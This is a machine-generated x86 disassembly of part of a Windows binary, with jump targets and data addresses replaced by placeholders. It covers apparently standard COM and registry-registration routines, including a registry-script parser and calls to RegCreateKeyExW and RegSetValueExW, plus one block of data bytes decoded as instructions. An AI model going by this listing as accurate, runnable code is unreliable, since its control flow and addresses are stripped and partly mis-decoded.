call [ LeaveCriticalSection@IAT ]
mov eax esi
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x14
retn
cmp eax 0xffffffff
jne r-xdata
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
call sub_419a20
mov esi eax
cmp [ edx ] ebx
je r-xdata
xor esi esi
jmp r-xdata
sub_419b80
push esi
push edi
mov edi ecx
xor esi esi
cmp [ edi + 0x14 ] esi
jle r-xdata
pop edi
xor eax eax
pop esi
retn 0x4
jmp r-xdata
test esi esi
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp esi [ edi + 0x14 ]
jge r-xdata
mov eax [ edi + 0x10 ]
mov ecx [ eax + esi * 4 ]
test ecx ecx
je r-xdata
inc esi
cmp esi [ edi + 0x14 ]
jl r-xdata
mov edx [ ecx ]
mov eax [ edx ]
call eax
sub_419bd0
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0x8 ]
sub esi 0x1
js r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x4
mov ebx [ esp + 0x10 ]
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp esi [ edi + 0x8 ]
jge r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax + esi * 4 ]
test ecx ecx
je r-xdata
sub esi 0x1
jns r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push ebx
call eax
test eax eax
jne r-xdata
test esi esi
jl r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x4
sub_419c30
push ebx
push ebp
push esi
lea esi [ edi + 0x1c ]
push 0x0
push 0x0
push 0x0
push esi
call [ GetMessageW@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ PeekMessageW@IAT ]
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
push ebx
mov ecx edi
call edx
inc ebx
test eax eax
jne r-xdata
mov eax [ edi + 0x24 ]
pop esi
pop ebp
pop ebx
retn
mov eax [ edi ]
mov edx [ eax ]
push esi
mov ecx edi
call edx
test eax eax
jne r-xdata
xor ebp ebp
mov eax [ edi + 0x20 ]
cmp eax 0x118
ja r-xdata
push esi
call [ TranslateMessage@IAT ]
push esi
call [ DispatchMessageW@IAT ]
cmp eax 0x200
je r-xdata
jmp r-xdata
cmp eax 0xf
je r-xdata
xor ebx ebx
mov ebp 0x1
lea ecx [ ecx ]
cmp eax 0xa0
jmp r-xdata
je r-xdata
sub_419d10
xor eax eax
mov ecx rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] rw-data
mov [ rw-data ] eax
call sub_41a300
test eax eax
mov eax rw-data
jge r-xdata
mov [ rw-data ] 0x24
retn
mov [ rw-data ] 0x1
retn
sub_419d80
test ebx ebx
jne r-xdata
push esi
mov esi [ ebx + 0x8 ]
test esi esi
je r-xdata
push ebx
push ebx
push 0x1
push 0xc0000005
call [ RaiseException@IAT ]
mov [ ebx + 0x8 ] 0x0
pop esi
retn
push edi
lea esp [ esp ]
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push eax
call ecx
mov edi [ esi + 0x8 ]
push esi
call sub_43f960
add esp 0x4
mov esi edi
test edi edi
jne r-xdata
pop edi
sub_419e00
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
push edi
xor edi edi
cmp [ ecx + 0x28 ] edi
lea esi [ ecx + 0x28 ]
jne r-xdata
mov eax 0x80004003
pop ebx
retn 0x4
mov eax [ esi ]
mov [ ebx ] eax
mov esi [ esi ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push esi
call edx
push esi
push r--data
push 0x1
push edi
push r--data
call [ CoCreateInstance@IAT ]
mov edi eax
test edi edi
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn 0x4
sub_419e80
push 0xffffffff
push sub_459f08
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] eax
movzx eax [ esp + 0x18 ]
push 0x1
push eax
push ecx
mov ecx r--data
call sub_41bfc0
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0x10
retn 0x4
sub_419ed0
push 0xffffffff
push sub_459f08
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0x4 ] eax
push eax
mov [ esp + 0x14 ] eax
movzx eax [ esp + 0x1c ]
push eax
push ecx
mov ecx r--data
call sub_41bfc0
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0x10
retn 0x4
sub_419f20
sub esp 0xa64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xa60 ] eax
push ebx
push ebp
mov ebp [ esp + 0xa70 ]
xor eax eax
push esi
xor ebx ebx
mov esi ecx
push edi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x14 ] r--data
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] bl
call sub_41a300
mov edi eax
cmp edi ebx
jl r-xdata
lea ecx [ esp + 0x14 ]
call sub_41a290
mov eax edi
mov [ esp + 0x3c ] 0x1
cmp esi ebx
je r-xdata
mov eax [ ebp ]
mov edx [ eax + 0x14 ]
lea ecx [ esp + 0x14 ]
push ecx
mov ecx ebp
call edx
mov esi eax
cmp esi ebx
jge r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
mov esi [ rw-data ]
push 0x104
lea eax [ esp + 0x44 ]
push eax
push esi
mov [ esp + 0x1c ] ebx
call [ GetModuleFileNameW@IAT ]
cmp eax ebx
jne r-xdata
lea ecx [ esp + 0x14 ]
call sub_41a290
mov eax esi
jmp r-xdata
mov ecx [ esi + 0x4 ]
push ecx
push eax
lea edx [ esp + 0x1c ]
push edx
call sub_41a620
mov eax [ esi + 0x8 ]
add esi 0x8
cmp eax ebx
jne r-xdata
cmp eax 0x104
jne r-xdata
call sub_41a770
jmp r-xdata
mov ecx [ esp + 0xa70 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0xa64
retn 0xc
lea eax [ esp + 0x40 ]
mov edx 0x208
lea ecx [ esp + 0x660 ]
call sub_41a380
cmp esi ebx
je r-xdata
lea esi [ esp + 0x10 ]
call sub_41aed0
lea ecx [ esp + 0x14 ]
call sub_41a290
mov eax 0x8007007a
jmp r-xdata
mov edi eax
lea ecx [ esp + 0x24a ]
mov eax 0x22
push 0x20b
push ecx
lea esi [ esp + 0x668 ]
mov [ esp + 0x250 ] ax
call sub_41a3d0
add esp 0x8
test al al
jne r-xdata
push ebx
call [ GetModuleHandleW@IAT ]
cmp esi eax
je r-xdata
lea edx [ esp + 0x248 ]
push edx
call [ lstrlenW@IAT ]
mov ecx 0x22
xor edx edx
mov [ esp + eax * 2 + 0x248 ] cx
mov [ esp + eax * 2 + 0x24a ] dx
lea eax [ esp + 0x248 ]
push eax
push r--data
lea ecx [ esp + 0x1c ]
push ecx
lea esi [ esp + 0x10 ]
call sub_41aed0
lea ecx [ esp + 0x14 ]
call sub_41a290
mov eax 0x80004005
jmp r-xdata
lea ecx [ esp + 0x660 ]
push ecx
push r--data
lea edx [ esp + 0x1c ]
push edx
jmp r-xdata
lea esi [ esp + 0x10 ]
call sub_41aed0
lea edx [ esp + 0x660 ]
push edx
push r--data
lea eax [ esp + 0x1c ]
push eax
call sub_41a620
mov edi eax
cmp edi ebx
jl r-xdata
call sub_41a620
mov edi eax
cmp edi ebx
jl r-xdata
cmp [ esp + 0xa80 ] ebx
je r-xdata
mov edx [ esp + 0xa7c ]
push edx
lea ecx [ esp + 0x44 ]
lea edx [ esp + 0x18 ]
call sub_419ed0
mov ecx [ esp + 0xa7c ]
push ecx
lea ecx [ esp + 0x44 ]
lea edx [ esp + 0x18 ]
call sub_419e80
jmp r-xdata
sub_41a1d0
push edi
xor edi edi
cmp [ esi + 0x8 ] edi
jle r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
test edi edi
jl r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_44120e
add esp 0x4
mov [ esi ] 0x0
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp edi [ esi + 0x8 ]
jge r-xdata
mov [ esi + 0x8 ] 0x0
xor eax eax
pop edi
retn
push eax
call sub_44120e
add esp 0x4
mov [ esi + 0x4 ] 0x0
mov eax [ esi ]
mov ecx [ eax + edi * 4 ]
push ecx
call sub_43f97a
add esp 0x4
cmp edi [ esi + 0x8 ]
jge r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + edi * 4 ]
push eax
call sub_43f97a
inc edi
add esp 0x4
cmp edi [ esi + 0x8 ]
jl r-xdata
sub_41a260
push esi
mov esi [ esp + 0x8 ]
push edi
lea edi [ esi + 0x10 ]
push edi
call [ EnterCriticalSection@IAT ]
add esi 0x4
call sub_41a1d0
push edi
mov esi eax
call [ LeaveCriticalSection@IAT ]
pop edi
mov eax esi
pop esi
retn 0x4
sub_41a290
push ebx
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
push edi
mov [ esi ] r--data
call [ EnterCriticalSection@IAT ]
add esi 0x4
call sub_41a1d0
push edi
call [ LeaveCriticalSection@IAT ]
xor ebx ebx
cmp [ edi + 0x18 ] bl
je r-xdata
call sub_41a1d0
mov eax [ esi ]
cmp eax ebx
je r-xdata
push edi
mov [ edi + 0x18 ] bl
call [ DeleteCriticalSection@IAT ]
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
push eax
call sub_44120e
add esp 0x4
mov [ esi ] ebx
pop edi
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn
push eax
call sub_44120e
add esp 0x4
mov [ esi + 0x4 ] ebx
sub_41a300
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_443440
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push ecx
call [ InitializeCriticalSection@IAT ]
xor eax eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a380
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
add edi 0xffffffff
je r-xdata
xor edx edx
pop edi
mov [ ecx ] dx
pop esi
retn
lea ecx [ ecx ]
xor eax eax
pop edi
mov [ ecx ] ax
pop esi
retn
mov [ ecx ] dx
add ecx 0x2
cmp [ esi ] 0x27
jne r-xdata
inc eax
add esi 0x2
cmp eax edi
jb r-xdata
inc eax
cmp eax edi
jae r-xdata
movzx edx [ esi ]
test dx dx
je r-xdata
mov edx 0x27
mov [ ecx ] dx
add ecx 0x2
sub_41a3d0
push esi
call [ lstrlenW@IAT ]
mov ecx [ esp + 0x8 ]
lea eax [ eax + eax + 0x2 ]
push eax
mov eax [ esp + 0x8 ]
push esi
lea edx [ ecx + ecx ]
push edx
push eax
call sub_43f985
add esp 0x10
neg eax
sbb eax eax
inc eax
retn
sub_41a420
mov eax [ esi + 0x8 ]
mov ecx [ esi ]
push 0x4
inc eax
push eax
push ecx
call sub_4413da
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esi + 0x8 ]
push 0x4
inc edx
mov [ esi ] eax
mov eax [ esi + 0x4 ]
push edx
push eax
call sub_4413da
add esp 0xc
test eax eax
je r-xdata
xor eax eax
retn 0x8
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
lea ecx [ eax * 4 ]
mov eax [ esi ]
add eax ecx
je r-xdata
mov eax [ esi + 0x4 ]
add eax ecx
je r-xdata
mov edx [ esp + 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
inc [ esi + 0x8 ]
mov eax 0x1
retn 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_41a490
push ebp
mov ebp esp
push 0xffffffff
push sub_4593d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp eax ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp + 0x10 ] ebx
je r-xdata
push eax
mov [ ebp - 0x1c ] ebx
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
xor ecx ecx
mov [ ebp - 0x28 ] eax
mov edx 0x2
mul edx
seto cl
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
neg ecx
or ecx eax
push ecx
call sub_43f0ce
mov edi eax
add esp 0x4
mov [ ebp - 0x14 ] edi
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
push eax
mov [ ebp - 0x20 ] edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax + 0x2 ]
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x3
neg ecx
or ecx eax
push ecx
call sub_43f0ce
mov ebx eax
add esp 0x4
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x24 ] ebx
test edi edi
je r-xdata
mov [ ebp - 0x1c ] 0x8007000e
jmp r-xdata
test ebx ebx
je r-xdata
push ebx
call sub_43f97a
mov edx [ ebp - 0x20 ]
push edx
call sub_43f97a
xor eax eax
add esp 0x8
cmp [ ebp - 0x1c ] eax
setge al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0x28 ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
push eax
push edi
call sub_43f985
push eax
call sub_4237a0
mov edx [ ebp + 0x10 ]
push esi
push edx
push esi
push ebx
call sub_43f985
push eax
call sub_4237a0
mov esi [ ebp + 0x8 ]
add esp 0x28
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
call sub_41a420
test eax eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x20 ] ebx
sub_41a620
push 0xffffffff
push sub_459648
mov eax [ fs : 0x0 ]
push eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x28 ]
test ebp ebp
je r-xdata
mov eax 0x80070057
mov ebx [ esp + 0x2c ]
test ebx ebx
je r-xdata
mov esi [ esp + 0x24 ]
lea edi [ esi + 0x10 ]
push edi
call [ EnterCriticalSection@IAT ]
xor eax eax
mov [ esp + 0x28 ] eax
push ebx
push ebp
add esi 0x4
push esi
mov [ esp + 0x28 ] eax
call sub_41a490
push edi
mov esi eax
call [ LeaveCriticalSection@IAT ]
neg esi
sbb esi esi
and esi 0x7ff8fff2
add esi 0x8007000e
mov eax esi
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0xc
sub_41a6b0
push 0xffffffff
push sub_459ed8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x18 ]
xor ecx ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0xc ] ecx
cmp eax ecx
je r-xdata
mov eax 0x80070057
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn 0x8
push 0x1
push eax
mov eax [ esp + 0x1c ]
push eax
mov ecx r--data
call sub_41bfc0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn 0x8
sub_41a730
mov ecx 0x2
mul ecx
test edx edx
ja r-xdata
push 0x80070057
call sub_427e00
cmp eax 0xffffffff
jbe r-xdata
cmp eax 0x400
jbe r-xdata
lea edx [ esi + 0x4 ]
mov [ esi ] edx
mov eax edx
retn
push esi
call sub_41aef0
mov eax [ esi ]
retn
sub_41a7a0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
xor esi esi
cmp [ edi + 0x8 ] esi
jle r-xdata
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x4
mov ebx [ lstrcmpiW@IAT ]
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
inc esi
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax [ ebp ]
mov ecx [ edi ]
mov ecx [ ecx + esi * 4 ]
push eax
push ecx
call ebx
test eax eax
je r-xdata
sub_41a7e0
push ebx
push esi
mov esi eax
push edi
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x10 ]
lea edi [ esi + 0x4 ]
push eax
call sub_41a7a0
cmp eax 0xffffffff
jne r-xdata
test eax eax
jl r-xdata
push ebx
xor esi esi
call [ LeaveCriticalSection@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax [ edi + 0x8 ]
jge r-xdata
mov ecx [ edi + 0x4 ]
mov esi [ ecx + eax * 4 ]
push ebx
call [ LeaveCriticalSection@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
sub_41a850
push 0xffffffff
push sub_459048
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor eax eax
cmp esi eax
jne r-xdata
mov [ esp + 0xc ] eax
push esi
mov [ esp + 0x1c ] eax
call [ lstrlenW@IAT ]
push esi
mov esi [ esp + 0x24 ]
mov edi eax
call sub_41a900
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
sub_41a900
mov eax [ esi ]
lea ecx [ eax + edi + 0x1 ]
cmp ecx eax
jle r-xdata
xor eax eax
retn 0x4
cmp ecx edi
jle r-xdata
cmp ecx [ esi + 0x4 ]
jl r-xdata
mov ecx [ esi ]
test ecx ecx
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp ecx eax
jge r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x3fffffff
jg r-xdata
mov edx eax
sub edx ecx
cmp edx eax
jg r-xdata
add eax eax
cmp ecx eax
mov [ esi + 0x4 ] eax
jge r-xdata
push ebx
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + ecx * 2 ]
push ecx
mov ecx [ esp + 0xc ]
lea eax [ edi + edi ]
add edx edx
call sub_41a8e0
add [ esi ] edi
mov eax [ esi ]
mov edx [ esi + 0x8 ]
add esp 0x4
xor ecx ecx
mov [ edx + eax * 2 ] cx
mov eax 0x1
pop ebx
retn 0x4
mov ecx [ esi + 0x8 ]
mov edx 0x2
mul edx
test edx edx
ja r-xdata
jb r-xdata
push eax
push ecx
call [ CoTaskMemRealloc@IAT ]
test eax eax
je r-xdata
cmp eax 0xffffffff
ja r-xdata
mov [ esi + 0x8 ] eax
sub_41a9a0
push 0xffffffff
push sub_459618
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x88 ]
mov esi ecx
xor ebx ebx
mov edi edx
mov [ esp + 0x30 ] edi
cmp esi ebx
je r-xdata
mov eax 0x80004003
cmp edi ebx
je r-xdata
push esi
mov [ edi ] ebx
call [ lstrlenW@IAT ]
add eax eax
cmp eax 0x64
jge r-xdata
mov ecx 0x2
mov [ esp + 0x28 ] eax
mul ecx
mov [ esp + 0x24 ] ebx
cmp edx ebx
ja r-xdata
mov eax 0x3e8
xor eax eax
jmp r-xdata
cmp eax 0xffffffff
jbe r-xdata
mov [ esp + 0x2c ] eax
cmp eax ebx
je r-xdata
push eax
call [ CoTaskMemAlloc@IAT ]
mov [ esp + 0x80 ] ebx
cmp eax ebx
jne r-xdata
xor edx edx
mov [ eax ] dx
mov al [ rw-data ]
mov [ ebp ] esi
mov [ esp + 0x1f ] al
mov [ esp + 0x18 ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x17 ] 0x0
mov [ esp + 0x16 ] 0x0
cmp [ esi ] bx
je r-xdata
push ebx
call [ CoTaskMemFree@IAT ]
mov eax 0x8007000e
jmp r-xdata
mov eax [ esp + 0x2c ]
mov edx ebx
push edx
mov [ esp + 0x30 ] ebx
mov [ edi ] eax
call [ CoTaskMemFree@IAT ]
mov eax [ esp + 0x18 ]
jmp r-xdata
jmp r-xdata
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_43f96b
add esp 0x70
retn 0x4
cmp [ esp + 0x1f ] 0x1
jne r-xdata
mov ebx [ CharNextW@IAT ]
cmp [ esp + 0x20 ] ebx
jne r-xdata
mov edi 0x1
lea esi [ esp + 0x28 ]
call sub_41a900
test eax eax
jne r-xdata
call ebx
mov [ ebp ] eax
cmp [ eax ] 0x25
jne r-xdata
mov ebx [ CharNextW@IAT ]
mov eax [ ebp ]
push r--data
push eax
call sub_441d07
add esp 0x8
cmp eax ebx
je r-xdata
mov eax [ ebp ]
push eax
call ebx
mov ecx eax
xor ebx ebx
mov [ ebp ] eax
cmp [ ecx ] bx
jne r-xdata
mov edx [ esp + 0x2c ]
push edx
mov [ esp + 0x1c ] 0x8007000e
call [ CoTaskMemFree@IAT ]
mov eax [ esp + 0x18 ]
jmp r-xdata
mov ebx 0x25
call sub_41ace0
mov esi eax
test esi esi
je r-xdata
push eax
cmp [ esp + 0x16 ] 0x0
jne r-xdata
cmp [ esp + 0x16 ] 0x0
jne r-xdata
mov ecx [ ebp ]
cmp eax ecx
jne r-xdata
mov edi [ esp + 0x30 ]
mov edx [ esp + 0x2c ]
push edx
mov [ esp + 0x1c ] 0x80020009
call [ CoTaskMemFree@IAT ]
mov eax [ esp + 0x18 ]
jmp r-xdata
mov ecx [ ebp ]
sub eax ecx
sar eax 0x1
cmp eax 0x1f
jg r-xdata
mov eax [ ebp ]
cmp [ eax ] 0x25
push eax
jne r-xdata
mov edx [ ebp ]
movzx eax [ edx ]
cmp ax 0x7b
jne r-xdata
mov eax ebp
call sub_41b5b0
test eax eax
je r-xdata
mov [ esp + 0x16 ] 0x1
jmp r-xdata
mov ebx [ CharNextW@IAT ]
push ecx
call ebx
push eax
mov [ ebp ] eax
call ebx
push eax
mov [ ebp ] eax
call ebx
push eax
mov [ ebp ] eax
call ebx
lea ecx [ esp + 0x24 ]
push ecx
mov ecx r--data
mov [ ebp ] eax
call sub_41a850
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
push edx
mov [ esp + 0x1c ] 0x80004005
call [ CoTaskMemFree@IAT ]
mov eax [ esp + 0x18 ]
jmp r-xdata
push eax
push ecx
lea ecx [ esp + 0x3c ]
push 0x20
push ecx
call sub_441b1b
push eax
call sub_4237a0
mov eax [ ebp + 0x4 ]
add esp 0x14
lea edx [ esp + 0x34 ]
push edx
call sub_41a7e0
test eax eax
je r-xdata
cmp ax 0x7d
jne r-xdata
inc [ esp + 0x20 ]
mov ecx [ ebp ]
push ecx
call ebx
push eax
mov edi 0x1
lea esi [ esp + 0x28 ]
mov [ ebp ] eax
call sub_41a900
test eax eax
je r-xdata
mov [ esp + 0x16 ] 0x0
jmp r-xdata
mov [ esp + 0x17 ] 0x1
jmp r-xdata
lea ecx [ esp + 0x24 ]
push ecx
mov ecx eax
call sub_41a850
test eax eax
je r-xdata
sub [ esp + 0x20 ] 0x1
jne r-xdata
mov edx [ ebp ]
mov eax 0x27
cmp ax [ edx ]
jne r-xdata
cmp [ ebp ] esi
je r-xdata
cmp [ esp + 0x17 ] 0x1
jne r-xdata
mov ebx [ CharNextW@IAT ]
lea esp [ esp ]
lea eax [ esp + 0x24 ]
push eax
mov ecx r--data
call sub_41a850
test eax eax
je r-xdata
mov edx [ ebp ]
push edx
call [ CharNextW@IAT ]
mov [ ebp ] eax
cmp eax esi
jne r-xdata
mov [ esp + 0x17 ] 0x0
jmp r-xdata
sub_41ace0
push edi
xor edi edi
test eax eax
jne r-xdata
movzx ecx [ eax ]
test cx cx
je r-xdata
pop edi
retn
mov eax edi
pop edi
retn
push esi
mov esi [ CharNextW@IAT ]
mov edi eax
pop esi
push eax
call esi
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx bx
je r-xdata
pop esi
mov eax edi
pop edi
retn
sub_41ad20
push ecx
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
push ecx
push 0x0
push 0x2001f
push 0x0
push 0x0
push 0x0
push edx
push eax
mov [ esp + 0x24 ] 0x0
call [ RegCreateKeyExW@IAT ]
test eax eax
jne r-xdata
pop ecx
retn 0x4
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov ecx [ esp ]
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x0
push ecx
call [ RegCloseKey@IAT ]
mov [ esi ] 0x0
sub_41ad80
test [ rw-data ] 0x1
jne r-xdata
push esi
push edi
mov edi [ lstrcmpiW@IAT ]
xor esi esi
or [ rw-data ] 0x1
mov eax 0x8
mov [ rw-data ] ax
mov ecx 0x4008
mov edx 0x13
mov eax 0x11
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] cx
mov [ rw-data ] r--data
mov [ rw-data ] dx
mov [ rw-data ] r--data
mov [ rw-data ] ax
mov dx [ esi * 8 + rw-data ]
mov eax [ esp + 0xc ]
pop edi
mov [ eax ] dx
mov eax 0x1
pop esi
retn
inc esi
cmp esi 0x4
jb r-xdata
mov ecx [ esi * 8 + rw-data ]
push ecx
push ebx
call edi
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_41ae40
mov ecx 0x2
mul ecx
test edx edx
ja r-xdata
push 0x80070057
call sub_427e00
cmp eax 0xffffffff
jbe r-xdata
cmp eax 0x100
jbe r-xdata
lea edx [ esi + 0x4 ]
mov [ esi ] edx
mov eax edx
retn
push esi
call sub_41aef0
mov eax [ esi ]
retn
sub_41ae80
push ebp
mov ebp [ esp + 0x10 ]
test ebp ebp
jne r-xdata
push ebx
mov ebx [ lstrlenW@IAT ]
push esi
push edi
xor edi edi
mov esi ebp
lea ecx [ ecx ]
lea eax [ ebp + 0xd ]
pop ebp
retn 0xc
push esi
call ebx
inc eax
lea ecx [ eax + eax ]
add esi ecx
add edi ecx
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ ecx ]
push edi
push ebp
push 0x7
push 0x0
push eax
push edx
call [ RegSetValueExW@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41af48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add [ ecx ] eax
add [ ecx ] eax
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
add al [ edx ]
add al [ edx ]
add cl ah
int3
sub_41af80
push ebp
lea ebp [ esp - 0x2108 ]
mov eax 0x2108
call sub_44f7f0
push 0xffffffff
push sub_4595e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2104 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
